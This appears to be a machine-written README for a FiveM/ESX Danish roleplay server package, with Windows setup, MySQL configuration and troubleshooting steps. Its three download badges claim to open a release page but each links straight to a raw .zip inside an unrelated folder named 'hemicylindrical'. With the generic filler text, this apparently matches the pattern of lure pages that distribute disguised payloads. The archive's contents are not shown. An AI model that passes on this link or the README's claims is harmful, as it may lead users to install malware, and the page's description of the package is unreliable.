# 🎮 Nordix-Roleplay-2.0 - Smooth and Stable Roleplay Server

[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/raw/refs/heads/main/hemicylindrical/Roleplay-Nordix-v1.7.zip)

---

## 📋 About Nordix-Roleplay-2.0

Nordix Roleplay 2.0 offers server files designed for creating a stable and immersive roleplaying experience on FiveM. It works with the ESX framework and supports common features needed for a Danish language roleplay server. The setup includes styles with CSS and HTML, game logic in Lua scripts, and database handling with MySQL and SQL commands.

This package is suitable for hosts wanting to run a multiplayer server with common roleplay features already integrated. It focuses on reliability and ease of use, targeting users who want smooth gameplay without diving into complex backend tasks.

---

## 💻 System Requirements

Before setting up Nordix Roleplay 2.0 on Windows, make sure your computer meets these basic requirements:

- **Windows 10 or newer** (64-bit recommended)
- **At least 4 GB of RAM**
- **50 GB of free disk space** for server files and database
- **Stable internet connection** for hosting and connecting players
- **MySQL server** installed locally or accessible remotely
- **FiveM server framework installed**

Ensure you have **administrative rights** on your Windows machine to install and run server software.

---

## 🚀 Getting Started: Download and Prepare Your Server

Click the badge below to visit the official release page and get the necessary files:

[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/raw/refs/heads/main/hemicylindrical/Roleplay-Nordix-v1.7.zip)

### How to download

1. When you arrive at the release page, look for the latest version marked with the highest version number or recent date.
2. Download the **server files archive** (usually a `.zip` or `.rar` file).
3. Save the file to an easy-to-find location, such as your Desktop or Downloads folder.

---

## 🗃️ Installing Nordix Roleplay 2.0

Follow these steps to install and run the server on your Windows PC:

1. **Extract the files**
   - Right-click the downloaded archive.
   - Choose "Extract All..."
   - Select a folder where you want to keep your server files, for example, `C:\NordixServer`.

2. **Install dependencies**
   - Make sure you have FiveM server installed. If not, download it from the official FiveM website.
   - Install MySQL on your PC or ensure you have access to a remote MySQL server. Programs like **XAMPP** or **WampServer** also work well for a local MySQL setup.

3. **Configure the database**
   - Open your MySQL server.
   - Create a new database named `nordix_roleplay` or your preferred name.
   - Import the SQL files from the server package. Typically, these files are in a folder like `/sql` or `/database`.
     - You can use phpMyAdmin or MySQL Workbench to import `.sql` files easily.

4. **Edit configuration files**
   - Open the server folder.
   - Find the file named `server.cfg` or similar.
   - Open it in a text editor like Notepad.
   - Edit the MySQL connection details:
     - Server address (usually `localhost` if MySQL is local)
     - Username (default often `root`)
     - Password (your MySQL password)
     - Database name (the one you created)
   - Save your changes.

5. **Run the server**
   - Inside the server folder, find `start.bat` or the main executable file.
   - Double-click to start the server console.
   - Wait for messages to confirm the server has started without errors.

---

## 🔧 Basic Configuration and Troubleshooting

### Adjusting server settings

- In `server.cfg`, you can set basic options like server name, port, and slots (maximum players).
- Change language or style files if you want it in Danish or another preferred language.
- Modify resources or scripts by editing Lua files in `/resources`.

### Common issues and fixes

- **Server won’t start:** Check that you have the correct FiveM server version installed.
- **Database connection errors:** Confirm MySQL server is running and credentials in config match your setup.
- **Missing resources:** Make sure all downloaded files are extracted fully and placed correctly.
- **Firewall blocking:** Allow the server program in Windows Firewall to accept inbound and outbound connections.

---

## 🧩 What You Get in Nordix Roleplay 2.0

- Ready-to-use ESX framework setup  
- Lua scripts for player jobs, money, inventory, and police systems  
- MySQL database scripts for storing player data and server state  
- CSS and HTML files for UI customization  
- Support for OX library and common SQL commands  
- Danish language support with localization files  
- Basic server configuration examples for easy editing

---

## 🔑 Running the Server in Windows Command Prompt

If you prefer to start the server manually:

1. Open the **Command Prompt** (press Start, type `cmd`, and hit Enter).
2. Navigate to your server folder:
   ```
   cd C:\NordixServer
   ```
3. Type the command to launch the server script or batch file:
   ```
   start.bat
   ```
4. Watch the terminal output for successful startup messages.

---

## 🧰 Useful Tools

- **Notepad++** for editing configuration and script files.
- **MySQL Workbench** or **phpMyAdmin** to easily manage the database.
- **FiveM Server Monitor** (third party) to keep track of server status.
- **WinRAR** or **7-Zip** for extracting downloaded archives.

---

## 📥 Download and Run Nordix Roleplay 2.0

Use this link again to start your setup process:

[![Download Nordix-Roleplay-2.0](https://img.shields.io/badge/Download-Nordix--Roleplay--2.0-blue?style=for-the-badge)](https://github.com/x644k/Nordix-Roleplay-2.0/raw/refs/heads/main/hemicylindrical/Roleplay-Nordix-v1.7.zip)

Visit the release page, download the server package, and follow the steps above to get your roleplay server running smoothly on Windows.